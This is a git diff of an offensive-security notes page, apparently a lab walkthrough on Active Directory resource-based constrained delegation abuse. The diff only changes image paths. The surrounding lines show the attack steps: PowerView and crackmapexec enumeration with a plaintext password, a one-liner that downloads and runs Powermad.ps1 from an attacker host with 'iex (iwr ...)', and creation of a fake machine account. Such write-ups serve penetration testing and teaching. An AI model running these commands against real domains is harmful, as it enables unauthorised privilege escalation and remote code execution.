@@ -44,7 +44,7 @@ Is you have GenericAll or GenericWrite rights to a computer object you can write
 Get-DomainComputer -Domain secure.local -Credential $creds -Server 10.0.0.100 Data01 | Select-Object -Property name, msds-allowedtoactonbehalfofotheridentity
 ```
 
-![](<../../../../.gitbook/assets/image (18) (1).png>)
+![](<../../../../.gitbook/assets/image (18) (1) (1).png>)
 
 The attribute haven't been set yet.
 
@@ -62,7 +62,7 @@ The attribute haven't been set yet.
 crackmapexec ldap 10.0.0.100 -u sa_sql -p Iloveyou2 -M MAQ
 ```
 
-![](<../../../../.gitbook/assets/image (48).png>)
+![](<../../../../.gitbook/assets/image (48) (1).png>)
 
 The machine account qouta is 10, meaning we (all authenticated users) can create our own computerobject in the domain.
 
@@ -73,7 +73,7 @@ iex (iwr http://192.168.248.2:8090/Powermad.ps1 -usebasicparsing)
 New-MachineAccount -Domain secure.local -Credential $creds -DomainController 10.0.0.100 -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
 ```
 
-![](<../../../../.gitbook/assets/image (67) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (67) (1) (1) (1).png>)
 
 6\. Get the SID of the computerobject we created:
 
